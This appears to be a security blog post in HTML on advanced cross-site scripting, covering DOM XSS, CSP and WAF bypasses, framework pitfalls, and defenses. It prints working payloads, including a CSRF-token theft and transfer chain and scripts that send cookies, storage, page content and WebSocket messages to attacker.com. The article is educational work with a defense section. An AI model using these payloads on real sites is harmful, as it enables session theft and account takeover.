@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cross-Site Scripting (XSS): Beyond the Basics — Francis Kuria</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            line-height: 1.6;
+            color: #e0e0e0;
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1a2e 100%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background: rgba(26, 26, 46, 0.8);
+            backdrop-filter: blur(10px);
+            padding: 20px 0;
+            margin-bottom: 40px;
+            border-bottom: 2px solid #3a86ff;
+        }
+        
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #3a86ff;
+            text-decoration: none;
+        }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 30px;
+        }
+        
+        nav a {
+            color: #e0e0e0;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        nav a:hover {
+            color: #3a86ff;
+        }
+        
+        .article-header {
+            margin-bottom: 40px;
+        }
+        
+        .article-meta {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .tag {
+            background: rgba(58, 134, 255, 0.2);
+            padding: 5px 15px;
+            border-radius: 20px;
+            color: #3a86ff;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        h1 {
+            font-size: 42px;
+            color: #ffffff;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+        
+        h2 {
+            font-size: 32px;
+            color: #ffffff;
+            margin: 40px 0 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #3a86ff;
+        }
+        
+        h3 {
+            font-size: 24px;
+            color: #3a86ff;
+            margin: 30px 0 15px;
+        }
+        
+        p {
+            margin-bottom: 20px;
+            font-size: 17px;
+            color: #d0d0d0;
+        }
+        
+        code {
+            background: rgba(58, 134, 255, 0.1);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #3a86ff;
+            font-size: 15px;
+        }
+        
+        pre {
+            background: #0d1117;
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 20px 0;
+            border-left: 4px solid #3a86ff;
+        }
+        
+        pre code {
+            background: none;
+            padding: 0;
+            color: #e0e0e0;
+            font-size: 14px;
+            display: block;
+            line-height: 1.5;
+        }
+        
+        ul, ol {
+            margin: 20px 0 20px 40px;
+            color: #d0d0d0;
+        }
+        
+        li {
+            margin-bottom: 10px;
+            font-size: 17px;
+        }
+        
+        .highlight {
+            background: rgba(58, 134, 255, 0.1);
+            border-left: 4px solid #3a86ff;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        
+        .warning {
+            background: rgba(255, 87, 87, 0.1);
+            border-left: 4px solid #ff5757;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        
+        .back-link {
+            display: inline-block;
+            color: #3a86ff;
+            text-decoration: none;
+            margin-top: 40px;
+            padding: 10px 20px;
+            border: 2px solid #3a86ff;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        
+        .back-link:hover {
+            background: #3a86ff;
+            color: #ffffff;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 40px 20px;
+            color: #888;
+            margin-top: 60px;
+            border-top: 1px solid rgba(58, 134, 255, 0.2);
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: #0d1117;
+        }
+        
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid rgba(58, 134, 255, 0.2);
+        }
+        
+        th {
+            background: rgba(58, 134, 255, 0.2);
+            color: #3a86ff;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <nav>
+            <a href="../index.html" class="logo">🛡️ Francis Kuria</a>
+            <ul>
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../index.html#work">Projects</a></li>
+                <li><a href="index.html">Blog</a></li>
+                <li><a href="../index.html#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <div class="container">
+        <article>
+            <div class="article-header">
+                <div class="article-meta">
+                    <span class="tag">🌐 XSS</span>
+                    <span class="tag">Web Security</span>
+                    <span>📅 Dec 28, 2025</span>
+                    <span>⏱️ 7 min read</span>
+                </div>
+                <h1>Cross-Site Scripting (XSS): Beyond the Basics</h1>
+            </div>
+
+            <p>If you're reading this, you probably already know that XSS is one of the most prevalent web vulnerabilities. But understanding basic reflected XSS is just scratching the surface. Modern web applications present unique challenges and opportunities for both attackers and defenders. Let's dive deep into advanced XSS techniques that go beyond <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>.</p>
+
+            <h2>DOM-Based XSS: The Silent Killer</h2>
+
+            <p>While reflected and stored XSS involve server-side vulnerabilities, DOM-based XSS exists entirely in the client's browser. This makes it harder to detect with traditional security scanners and WAFs.</p>
+
+            <h3>Understanding the DOM XSS Flow</h3>
+
+            <pre><code>// Vulnerable code example
+const params = new URLSearchParams(window.location.search);
+const username = params.get('user');
+
+// Dangerous: Directly inserting user input into DOM
+document.getElementById('welcome').innerHTML = 'Welcome, ' + username;</code></pre>
+
+            <p>In this scenario, the server never sees the malicious payload. The vulnerability exists purely in JavaScript execution. An attacker could craft a URL like:</p>
+
+            <pre><code>https://example.com/profile?user=&lt;img src=x onerror=alert(document.cookie)&gt;</code></pre>
+
+            <h3>Advanced DOM XSS Vectors</h3>
+
+            <p>Modern JavaScript frameworks introduce new attack surfaces. Here are some less obvious DOM XSS vectors:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Source</th>
+                        <th>Sink</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>location.hash</code></td>
+                        <td><code>eval()</code></td>
+                        <td><code>eval(location.hash.slice(1))</code></td>
+                    </tr>
+                    <tr>
+                        <td><code>document.referrer</code></td>
+                        <td><code>innerHTML</code></td>
+                        <td><code>el.innerHTML = document.referrer</code></td>
+                    </tr>
+                    <tr>
+                        <td><code>postMessage</code></td>
+                        <td><code>window.location</code></td>
+                        <td><code>window.location = event.data</code></td>
+                    </tr>
+                    <tr>
+                        <td><code>localStorage</code></td>
+                        <td><code>document.write</code></td>
+                        <td><code>document.write(localStorage.getItem('data'))</code></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h2>Bypassing Modern Defenses</h2>
+
+            <p>As defenses evolve, so do attack techniques. Let's explore how to bypass common XSS protections.</p>
+
+            <h3>Content Security Policy (CSP) Bypass</h3>
+
+            <p>CSP is a powerful defense mechanism, but misconfigurations are common. Here are techniques to bypass weak CSP implementations:</p>
+
+            <div class="highlight">
+                <h4>1. JSONP Endpoints Abuse</h4>
+                <pre><code>Content-Security-Policy: script-src 'self' https://trusted-cdn.com
+
+// If trusted-cdn.com has a JSONP endpoint:
+&lt;script src="https://trusted-cdn.com/jsonp?callback=alert(document.cookie)"&gt;&lt;/script&gt;</code></pre>
+
+                <h4>2. Base Tag Injection</h4>
+                <pre><code>// When CSP allows 'self'
+&lt;base href="https://attacker.com/"&gt;
+&lt;script src="/malicious.js"&gt;&lt;/script&gt;</code></pre>
+
+                <h4>3. Script Gadgets</h4>
+                <pre><code>// Exploiting legitimate library features
+&lt;div ng-app ng-csp&gt;
+    {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+&lt;/div&gt;</code></pre>
+            </div>
+
+            <h3>WAF Evasion Techniques</h3>
+
+            <p>Web Application Firewalls often use regex patterns to detect XSS. Here are techniques to evade them:</p>
+
+            <pre><code>// Case variation and encoding
+&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+
+// HTML encoding
+&lt;img src=x onerror="&#97;lert(1)"&gt;
+
+// JavaScript encoding
+&lt;script&gt;\u0061lert(1)&lt;/script&gt;
+
+// Null byte injection (in some contexts)
+&lt;script&gt;al\x00ert(1)&lt;/script&gt;
+
+// Using JavaScript comments
+&lt;script&gt;al/*comment*/ert(1)&lt;/script&gt;
+
+// Template literals
+&lt;script&gt;alert`1`&lt;/script&gt;
+
+// Alternative execution contexts
+&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt;
+
+// Using existing DOM elements
+&lt;form action="javascript:alert(1)"&gt;&lt;button&gt;Click&lt;/button&gt;&lt;/form&gt;</code></pre>
+
+            <h2>Exploiting Modern JavaScript Frameworks</h2>
+
+            <p>Single-page applications built with React, Vue, or Angular introduce unique XSS vectors.</p>
+
+            <h3>React XSS Vulnerabilities</h3>
+
+            <p>While React escapes content by default, certain patterns can introduce vulnerabilities:</p>
+
+            <pre><code>// Dangerous: dangerouslySetInnerHTML
+function UserProfile({ bio }) {
+    return &lt;div dangerouslySetInnerHTML={{__html: bio}} /&gt;;
+}
+
+// Dangerous: href with javascript:
+function Link({ url }) {
+    return &lt;a href={url}&gt;Click me&lt;/a&gt;; // XSS if url = "javascript:alert(1)"
+}
+
+// Dangerous: Server-side rendering with user input
+const html = ReactDOMServer.renderToString(&lt;div&gt;{userInput}&lt;/div&gt;);</code></pre>
+
+            <h3>Vue.js Template Injection</h3>
+
+            <pre><code>// Vulnerable Vue template
+&lt;div v-html="userContent"&gt;&lt;/div&gt;
+
+// Server-side template injection
+new Vue({
+    template: '&lt;div&gt;' + userInput + '&lt;/div&gt;' // Dangerous!
+});</code></pre>
+
+            <h3>Angular Expression Injection</h3>
+
+            <pre><code>// AngularJS (1.x) sandbox bypass
+{{constructor.constructor('alert(1)')()}}
+
+// Angular (2+) template injection via server-side rendering
+&lt;div [innerHTML]="userContent"&gt;&lt;/div&gt;</code></pre>
+
+            <h2>Advanced Exploitation Techniques</h2>
+
+            <h3>Chaining XSS with Other Vulnerabilities</h3>
+
+            <p>XSS becomes significantly more dangerous when combined with other vulnerabilities:</p>
+
+            <div class="highlight">
+                <h4>XSS + CSRF</h4>
+                <p>Use XSS to bypass CSRF tokens and perform actions on behalf of the victim:</p>
+                <pre><code>&lt;script&gt;
+fetch('/api/user', {
+    credentials: 'include'
+}).then(r => r.text()).then(html => {
+    // Extract CSRF token from response
+    const token = html.match(/csrf_token":\s*"([^"]+)"/)[1];
+    
+    // Perform privileged action
+    fetch('/api/transfer', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {'X-CSRF-Token': token},
+        body: JSON.stringify({to: 'attacker', amount: 1000})
+    });
+});
+&lt;/script&gt;</code></pre>
+
+                <h4>XSS + WebSocket Hijacking</h4>
+                <pre><code>&lt;script&gt;
+const ws = new WebSocket('wss://example.com/chat');
+ws.onopen = () => {
+    // Intercept and exfiltrate messages
+    ws.onmessage = (msg) => {
+        fetch('https://attacker.com/log?data=' + btoa(msg.data));
+    };
+};
+&lt;/script&gt;</code></pre>
+            </div>
+
+            <h3>Blind XSS for Maximum Impact</h3>
+
+            <p>Blind XSS occurs when your payload executes in a context you can't directly see (admin panels, log viewers, support tickets). Here's an effective blind XSS payload:</p>
+
+            <pre><code>&lt;script&gt;
+(function() {
+    const data = {
+        url: window.location.href,
+        cookies: document.cookie,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        dom: document.documentElement.outerHTML.substring(0, 5000)
+    };
+    
+    fetch('https://attacker.com/collect', {
+        method: 'POST',
+        body: JSON.stringify(data)
+    });
+    
+    // Take screenshot (if possible)
+    html2canvas(document.body).then(canvas => {
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('screenshot', blob);
+            fetch('https://attacker.com/screenshot', {
+                method: 'POST',
+                body: formData
+            });
+        });
+    });
+})();
+&lt;/script&gt;</code></pre>
+
+            <h2>Defense Strategies</h2>
+
+            <p>Understanding attacks is only half the battle. Here are robust defense strategies:</p>
+
+            <h3>1. Content Security Policy (Properly Configured)</h3>
+
+            <pre><code>Content-Security-Policy:
+    default-src 'none';
+    script-src 'self';
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' https:;
+    connect-src 'self';
+    font-src 'self';
+    frame-ancestors 'none';
+    base-uri 'self';
+    form-action 'self';</code></pre>
+
+            <h3>2. Context-Aware Output Encoding</h3>
+
+            <pre><code>// HTML context
+function escapeHTML(str) {
+    return str.replace(/[&<>"']/g, char => ({
+        '&': '&amp;',
+        '<': '&lt;',
+        '>': '&gt;',
+        '"': '&quot;',
+        "'": '&#x27;'
+    })[char]);
+}
+
+// JavaScript context
+function escapeJS(str) {
+    return str.replace(/[\\'"<>\n\r]/g, char => '\\u' + 
+        ('0000' + char.charCodeAt(0).toString(16)).slice(-4));
+}
+
+// URL context
+function escapeURL(str) {
+    return encodeURIComponent(str);
+}</code></pre>
+
+            <h3>3. Use Framework Security Features</h3>
+
+            <ul>
+                <li><strong>React</strong>: Avoid <code>dangerouslySetInnerHTML</code>, validate href attributes</li>
+                <li><strong>Vue</strong>: Use <code>v-text</code> instead of <code>v-html</code> when possible</li>
+                <li><strong>Angular</strong>: Leverage built-in sanitization, avoid bypassing with <code>bypassSecurityTrust</code></li>
+            </ul>
+
+            <h3>4. Implement Defense in Depth</h3>
+
+            <div class="highlight">
+                <ul>
+                    <li>Input validation and sanitization</li>
+                    <li>Output encoding appropriate to context</li>
+                    <li>Content Security Policy</li>
+                    <li>HTTPOnly and Secure cookie flags</li>
+                    <li>X-XSS-Protection header (legacy browsers)</li>
+                    <li>Regular security audits and penetration testing</li>
+                    <li>Security training for developers</li>
+                </ul>
+            </div>
+
+            <div class="warning">
+                <h3>⚠️ Responsible Disclosure</h3>
+                <p>If you discover XSS vulnerabilities during security research, always follow responsible disclosure practices. Never exploit vulnerabilities on systems you don't own or have explicit permission to test. Report findings to the appropriate security team and allow reasonable time for remediation before public disclosure.</p>
+            </div>
+
+            <h2>Conclusion</h2>
+
+            <p>XSS remains one of the most critical web security vulnerabilities despite decades of awareness. Modern web applications, with their complex JavaScript frameworks and rich client-side functionality, present both new challenges and opportunities for exploitation and defense.</p>
+
+            <p>The key to effective XSS prevention is understanding that there's no silver bullet. A layered defense approach combining proper output encoding, CSP, framework security features, and security-aware development practices provides the best protection against XSS attacks.</p>
+
+            <p>Stay curious, keep learning, and remember that security is an ongoing process, not a destination.</p>
+
+            <a href="index.html" class="back-link">← Back to Blog</a>
+        </article>
+    </div>
+
+    <footer>
+        <p>© 2026 Francis Kuria • Sharing security knowledge, one post at a time</p>
+    </footer>
+</body>
+</html>
